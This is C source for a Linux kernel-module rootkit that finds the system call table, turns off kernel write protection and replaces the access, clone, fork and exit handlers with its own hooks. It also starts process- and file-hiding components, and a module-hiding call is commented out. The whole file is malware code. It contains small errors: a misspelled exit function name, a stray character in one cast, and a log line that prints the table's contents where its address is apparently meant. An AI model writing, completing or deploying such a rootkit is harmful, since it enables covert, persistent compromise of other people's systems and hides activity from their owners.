#include "main.h"

static unsigned long *syscall_table;

asmlinkage long (*orig_access)(const struct pt_regs *);
asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
asmlinkage long (*orig_fork)(void);
asmlinkage long (*orig_exit)(int);

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init() || hidefs_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

    // module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    orig_access = (asmlinkage long (*)(const struct pt_regs *))syscall_table[__NR_access];
    orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
    orig_fork = (asmlinkage long (*)(void))syscall_table[__NR_fork];
    orig_exit = (asmlinkage long (*)(int))syscall_table[__NR_exit];

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)rk_access;
    syscall_table[__NR_clone] = (unsigned long)rk_clone;
    syscall_table[__NR_fork] = (unsigned long)rk_fork;
    syscall_table[__NR_exit] = (unsigned long)rk_exit;

    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)orig_access;
    syscall_table[__NR_clone] = (unsigned long)orig_clone;
    syscall_table[__NR_fork] = (unsigned long)orig_fork;
    syscall_table[__NR_exit] = (unsigned long)orig_exit;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}
